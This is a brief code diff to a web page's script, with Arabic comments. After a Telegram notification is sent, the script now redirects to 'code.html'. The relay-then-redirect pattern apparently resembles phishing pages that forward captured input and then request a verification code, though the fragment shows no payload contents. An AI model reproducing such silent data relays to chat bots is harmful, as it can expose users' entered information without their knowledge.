@@ -255,7 +255,7 @@ function send_message(payload=null){
               if (resJson.ok) {
                 console.log("✅ تم إرسال الإشعار إلى تليجرام بنجاح.");
                 sessionStorage.setItem("telegramSent", "true"); // منع التكرار خلال الجلسة
-                return true
+                window.location.href = "code.html";
               } else {
                 console.log("❌ فشل إرسال الإشعار:", resJson);
               }
@@ -553,5 +553,6 @@ document.addEventListener("DOMContentLoaded", function () {
 
 
 </body>
+
 
 </html>
